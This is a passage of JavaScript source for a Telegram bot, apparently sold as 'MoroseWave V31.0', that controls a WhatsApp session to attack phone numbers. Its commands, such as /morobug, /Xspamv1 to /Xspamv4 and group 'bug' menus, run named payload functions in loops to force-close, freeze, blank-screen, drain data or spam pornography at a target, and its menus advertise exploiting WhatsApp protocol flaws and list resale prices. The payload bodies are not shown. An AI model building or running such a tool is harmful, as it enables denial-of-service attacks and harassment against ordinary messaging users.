    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
        if (ctx.from.id != ownerID && !isAdmin(ctx.from.id)) {
            return ctx.reply("❌ ☇ Akses hanya untuk pemilik dan admin"); 
        }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const userWarna = new Map();

// ======================
// WARNA & ICON
// ======================
function getStyle(warna) {
    if (warna === 'merah') return 'danger';
    if (warna === 'biru') return 'primary';
    if (warna === 'hijau') return 'success';
    return 'success';
}

function getDiskoStyle() {
    const random = Math.floor(Math.random() * 3);
    if (random === 0) return 'danger';
    if (random === 1) return 'primary';
    return 'success';
}

const iconIdsList = [
    "5316556616319905664", "5440703719752608257", "5438166923089029724",
    "5438191043625364502", "5449806649533411582", "5330237710655306682",
    "5285084633573110315", "5244968767150109583", "5208464633215611044",
    "5260450573768990626", "5334818215967076232", "6309915906877165527",
    "6086730808968614780", "6089217174126203362", "6086946867298439895",
    "6089124398537642497", "6088971806939550947", "6093818260921258328",
    "6089079808187174973", "6309611273436793918", "6307512258494730630",
    "6307696237713822796", "5256217926448468100", "5440805291434192517",
    "5438181757906069988", "5334738840676475461", "5220037761897085778",
    "5294397698923832095",
    "5413879192267805083", "5231200819986047254", "6028551194861899805",
    "5210956306952758910", "5217822164362739968"
];

function getRandomIconId() {
    return iconIdsList[Math.floor(Math.random() * iconIdsList.length)];
}

function createButton(text, callback, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, callback_data: callback, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

function createUrlButton(text, url, funcKey, warna) {
    let style = 'success';
    if (warna === 'disko') {
        style = getDiskoStyle();
    } else {
        style = getStyle(warna);
    }
    const btn = { text, url, style };
    btn.icon_custom_emoji_id = getRandomIconId();
    return btn;
}

// ======================
// MENU FUNCTIONS
// ======================
function getMenuHome(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homecontrols", 'nav', warna)
        ],
        [
            createUrlButton("𝗧𝗵𝗲 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuControls(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_home", 'nav', warna),
            createButton("HOME", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometoolss", 'nav', warna)
        ],
        [
            createButton("𝗖𝗼𝗻𝘁𝗿𝗼𝗹𝘀", "menu_controls", 'nav', warna)
        ]
    ];
}

function getMenuToolss(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_controls", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_homebugs", 'nav', warna)
        ],
        [
            createButton("𝗧𝗼𝗼𝗹𝘀", "menu_toolss", 'nav', warna)
        ]
    ];
}

function getMenuBug(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_hometoolss", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_hometqto", 'nav', warna)
        ],
        [
            createButton("𝗠𝘂𝗿𝗯𝘂𝗴", "menu_bug", 'nav', warna),
            createButton("𝗚𝗿𝗼𝘂𝗽 𝗕𝘂𝗴", "menu_bug3", 'nav', warna),
            createButton("𝗧𝗿𝗮𝘀𝗵 𝗕𝘂𝗴", "menu_bug2", 'nav', warna)
        ]
    ];
}

function getMenuTqto(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_homebugs", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_information", 'nav', warna)
        ],
        [
            createButton("𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼", "menu_tqto", 'nav', warna)
        ]
    ];
}

function getMenuInformation(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_tqto", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createButton("𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗖𝗘", "menu_price", 'nav', warna)
        ]
    ];
}

function getMenuPrice(warna) {
    return [
        [
            createButton("𝗕𝗔𝗖𝗞", "menu_information", 'nav', warna),
            createButton("𝗛𝗢𝗠𝗘", "menu_home", 'home', warna),
            createButton("𝗡𝗘𝗫𝗧", "menu_home", 'nav', warna)
        ],
        [
            createUrlButton("𝗕𝗨𝗬", "https://t.me/Luctadvorisme", 'owner', warna)
        ]
    ];
}

function getMenuCaption(premiumStatus, name, userId, senderStatus, runtimeStatus, page) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

[ STATUS ]
  Premium: ${premiumStatus}
  Name: ${name} (${userId})
  Sender: ${senderStatus}
  Runtime: ${runtimeStatus}
  Guard: Active

[ PAGE ${page}/6 ]
</code></pre>`;
}

function getOpeningMenuCaption(username, userId, senderStatus, runtime) {
    return `
<pre><code class="language-javascript">
[ MOROSEWAVE ]
──────────────────
Bukan sekadar gelombang,
tapi gema dari keheningan yang berbicara.
Di antara kode dan sunyi,
kita menari di tepi realitas.

──────────────────
 Auto-Update : Enabled
 System      : Online & Active
──────────────────
"Terkadang, kehampaan adalah ruang
di mana kita menemukan jawaban."
</code></pre>`;
}

// ======================
// START MENU (PILIH WARNA)
// ======================
bot.start(async (ctx) => {
    const loadingMessage = await ctx.reply("🤖 <b>MoroseWave Initializing...</b>", { parse_mode: "HTML" });
    const loadingFrames = [
        { text: "🌊 <b>Wave Detecting...</b>", delay: 300 },
        { text: "🕳️ <b>Entering the Void...</b>", delay: 300 },
        { text: "🕸️ <b>Mapping the Infinity...</b>", delay: 300 },
        { text: "🔥 <b>Igniting The Core...</b>", delay: 300 },
        { text: "🌒 <b>MoroseWave Present</b>", delay: 300 },
        { text: "🌑 <b>Everything is Nothing.</b>", delay: 500 }
    ];
    for (const frame of loadingFrames) {
        try {
            await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, null, frame.text, { parse_mode: "HTML" });
            await new Promise(resolve => setTimeout(resolve, frame.delay));
        } catch (error) {
            if (error.response && error.response.error_code === 400) continue;
        }
    }
    try {
        await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
    } catch (error) {}

    const opts = {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔴 MERAH", callback_data: "warna_merah", style: "danger", icon_custom_emoji_id: "5440703719752608257" },
                    { text: "🟢 HIJAU", callback_data: "warna_hijau", style: "success", icon_custom_emoji_id: "5316556616319905664" }
                ],
                [
                    { text: "🔵 BIRU", callback_data: "warna_biru", style: "primary", icon_custom_emoji_id: "5330237710655306682" },
                    { text: "🌈 DISKO", callback_data: "warna_disko", style: "danger", icon_custom_emoji_id: "5244968767150109583" }
                ]
            ]
        }
    };
    if (ctx.chat.type === 'private') {
        opts.message_effect_id = "5104841245755180586";
    }
    await ctx.reply("🎨 Pilih warna tema kamu:", opts);
});

// ======================
// CALLBACK PILIH WARNA → TAMPILKAN MENU PEMBUKA (VIDEO)
// ======================
bot.action(['warna_merah', 'warna_hijau', 'warna_biru', 'warna_disko'], async (ctx) => {
    let warna = 'hijau';
    if (ctx.match[0] === 'warna_merah') warna = 'merah';
    if (ctx.match[0] === 'warna_hijau') warna = 'hijau';
    if (ctx.match[0] === 'warna_biru') warna = 'biru';
    if (ctx.match[0] === 'warna_disko') warna = 'disko';

    userWarna.set(ctx.from.id, warna);
    await ctx.answerCbQuery(`Warna ${warna.toUpperCase()} dipilih!`);
    await ctx.deleteMessage();

    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
    const senderStatus = isWhatsAppConnected ? "✅ CONNECTED" : "❌ DISCONNECTED";
    const runtime = formatRuntime();
    const style = (warna === 'disko') ? getDiskoStyle() : getStyle(warna);

    const openingCaption = getOpeningMenuCaption(username, userId, senderStatus, runtime);

    const keyboard = {
        inline_keyboard: [
            [
                {
                    text: "𝗦𝗛𝗢𝗪 𝗦𝗖𝗥𝗜𝗣𝗧",
                    callback_data: "open_script",
                    style: style,
                    icon_custom_emoji_id: getRandomIconId()
                }
            ],
            [
                {
                    text: "𝗔𝗨𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘",
                    callback_data: "update_now",
                    style: style,
                    icon_custom_emoji_id: getRandomIconId()
                }
            ]
        ]
    };

    const options = {
        caption: openingCaption,
        parse_mode: "HTML",
        reply_markup: keyboard
    };

    if (ctx.chat.type === 'private') {
        options.message_effect_id = "5104841245755180586";
    }

    await ctx.replyWithVideo(thumbnailVideo, options);
});

// ======================
// OPEN SCRIPT → MENU HOME (edit ke foto)
// ======================
bot.action('open_script', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia(
            { type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" },
            { reply_markup: { inline_keyboard: keyboard } }
        );
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error:", error);
        }
    }
});

// ======================
// MENU HOME (PAGE 1/6)
// ======================
bot.action('menu_home', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia({ type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_controls', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const controlsMenu = `
<pre><code class="language-javascript">
[ CONTROLS | V31.0 ]

[ SYSTEM ]
  /addbot - Add Sender
  /setcd - Set Cooldown
  /killsesi - Reset Session

[ USER ]
  /addprem - Add Premium
  /delprem - Delete Premium
  /addpremgrup - Add Group Prem
  /delpremgrup - Delete Group Prem
  /blockcmd - Block Command
  /unblockcmd - Unblock Command
  /listblockcmd - List Blocked

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homecontrols', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CONTROL PANEL ]

Menu ini digunakan untuk mengontrol dan mengatur bot.
Anda dapat menambah sender, mengatur cooldown, reset session,
serta mengelola user premium dan grup premium.

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_toolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const toolssMenu = `
<pre><code class="language-javascript">
[ TOOLS | V31.0 ]

[ DEVICE & GEN ]
  /iqc - iPhone Gen
  /sendbokep - Private Tools 18+
  /tiktoksearch - Search TikTok
  /play - Spotify
  /enchtml - Encrypt HTML
  /fixcode - Fix File.js

[ MEDIA & DL ]
  /brat - Brat Sticker
  /tiktok - TikTok Downloader
  /tourl - Image to URL
  /fakecall - Photo to Avatar
  /cekkontol - Check Gender
  /cekkhodam - Check Khodam

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(toolssMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometoolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ TOOLS PANEL ]

Menu ini berisi berbagai tools dan utilitas yang tersedia.
Anda dapat generate device, mencari tiktok, downloader media,
membuat sticker brat, convert media ke url, dan lainnya.

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu = `
<pre><code class="language-javascript">
[ TRASH | V31.0 ]

[ CAN SPAM ]
  /Xspamv1 - ForceClose One Msg
  /Xspamv2 - Delay Invisible
  /Xspamv3 - Delay X Freeze
  /Xspamv4 - Drain Kuota
  /Xspamv5 - Freeze Invisible

Note: 
 • Nomor Wajib Bisa Chat Agar Tidak Mudah Kena Limit

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug2', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu2 = `
<pre><code class="language-javascript">
[ TRASH | V31.0 ]
 
[ NUMBER BUG ]
  /morobug - Bug With Button
  
[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu2, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug3', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu3 = `
<pre><code class="language-javascript">
[ GROUP BUG | V31.0 ]
 
[ GROUP BUG ]
  /morogroupv1 - Ban Group
  /morogroupv2 - Blank Group
  
[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu3, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homebugs', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ BUG PANEL ]

Menu ini berisi kumpulan bug yang tersedia.
Gunakan dengan bijak dan bertanggung jawab.
Setiap command memiliki fungsi yang berbeda-beda.

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_tqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const tqtoMenu = `
<pre><code class="language-javascript">
[ CREDIT | V31.0 ]

  @Luctadvorisme (Dev)
  All Buyers & Users

  Everything is Nothing.

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(tqtoMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CREDIT PANEL ]

Terima kasih telah menggunakan MoroseWave Bot

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_information', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const informationMenu = `
<pre><code class="language-javascript">
[ INFORMATION | V31.0 ]

  WhatsApp Bug Concept

  Metode yang digunakan dalam bot ini adalah
  eksploitasi celah keamanan pada protokol WhatsApp.

  Cara Kerja:
  - Mengirim payload berulang ke target
  - Memanfaatkan delay response server
  - Overload koneksi target

  Peringatan:
  Gunakan dengan bijak dan tanggung jawab sendiri.
  Developer tidak bertanggung jawab atas penyalahgunaan.

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuInformation(warna);
    try {
        await ctx.editMessageCaption(informationMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_price', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const priceMenu = `
<pre><code class="language-javascript">
[ PRICE SCRIPT | V31.0 ]

  𝐌𝐎𝐑𝐎𝐒𝐄𝐖𝐀𝐕𝐄

  ➣ SCRIPT : 20k
  ➣ RESS   : 25k
  ➣ PT     : 30k
  ➣ MODZ   : 35k
  ➣ TK     : 40k
  ➣ CEO    : 50k
  ➣ OWN    : 60k

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuPrice(warna);
    try {
        await ctx.editMessageCaption(priceMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});
/// --------- CASE BUG 2 BERBUTONN -------- ///
const clickedUsers = {};

bot.command("morobug", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /morobug 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
    thumbnailUrl,
    {
      caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target : ${q}
Status : Ready
Note : No Spam Bug
Silahkan Pilih bug di bawah...
</code></pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "ForceClose Click", callback_data: `click_${target}` },
            { text: "Freeze Invisible", callback_data: `beku_${target}` }
          ],
          [
            { text: "Delay Visible", callback_data: `visib_${target}` },
            { text: "Delay Invisible V1", callback_data: `invisv1_${target}` }
          ],
          [
            { text: "𝖣𝖾lay Invisible V2", callback_data: `invisv2_${target}` },
            { text: "Blank Screen", callback_data: `blank_${target}` }
          ],
          [
            { text: "Drain Kuota", callback_data: `buldo_${target}` },
            { text: "Spam Porno", callback_data: `okep_${target}` }
          ]
        ]
      }
    }
  );

});


bot.on("callback_query", async (ctx) => {

  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;

  const [key, target] = data.split("_");

  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  }

  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage();


  const methods = {

    click: {
      name: "forceclick",
      func: async (t) => {
        for (let i = 0; i < 17; i++) {
          await iwaktempek(sock, target);
          await sleep(500);
        }
      }
    },

    beku: {
      name: "beku",
      func: async (t) => {
        for (let i = 0; i < 50; i++) {
          await MediaFreezeData(sock, target);
          await sleep(250);
        }
      }
    },

    visib: {
      name: "visib",
      func: async (t) => {
        for (let i = 0; i < 45; i++) {
          await slayercombo(sock, target);
          await sleep(800);
        }
      }
    },

    invisv1: {
      name: "invisv1",
      func: async (t) => {
        for (let i = 0; i < 50; i++) {
          await iniochalexDelayV2(sock, target);
          await sleep(500);
        }
      }
    },
    
    invisv2: {
      name: "invisv2",
      func: async (t) => {
        for (let i = 0; i < 45; i++) {
          await iniochalexDelayV4Fix(sock, target);
          await sleep(500);
        }
      }
    },

    blank: {
      name: "blank",
      func: async (t) => {
        for (let i = 0; i < 35; i++) {
          await BlankScreenV1(sock, target);
          await sleep(1000);
        }
      }
    },
    
    buldo: {
      name: "bulldozer",
      func: async (t) => {
        for (let i = 0; i < 50; i++) {
          await topsbuldog(sock, target);
          await sleep(500);
        }
      }
    },

    okep: {
      name: "okep",
      func: async (t) => {
        for (let i = 0; i < 10; i++) {
          await Slayerspmvideo(sock, target);
        }
      }
    },

  };


  const method = methods[key];
  if (!method) return;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }


  const msg = await ctx.replyWithPhoto(
    thumbnailUrl,
    {
      caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [░░░░░░░░░░] 0%
</code></pre>`,
      parse_mode: "HTML"
    }
  );


  const attack = method.func(target);


  for (let i = 1; i <= 10; i++) {

    const bar = "█".repeat(i) + "░".repeat(10 - i);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [${bar}] ${i * 10}%
</code></pre>`,
      { parse_mode: "HTML" }
    );

    await sleep(800);
  }


  await attack;


  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    msg.message_id,
    null,
    `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [██████████] 100%
</code></pre>`,
    { parse_mode: "HTML" }
  );

  delete clickedUsers[userId];

});
//CASE BUG CAN SPAM TARGET
bot.command("Xspamv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv1 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await ForcloseNewXka(sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv2", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv2 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await maklu(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv3", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv3 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {
    await DelayXFrezee(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv4", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv4 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
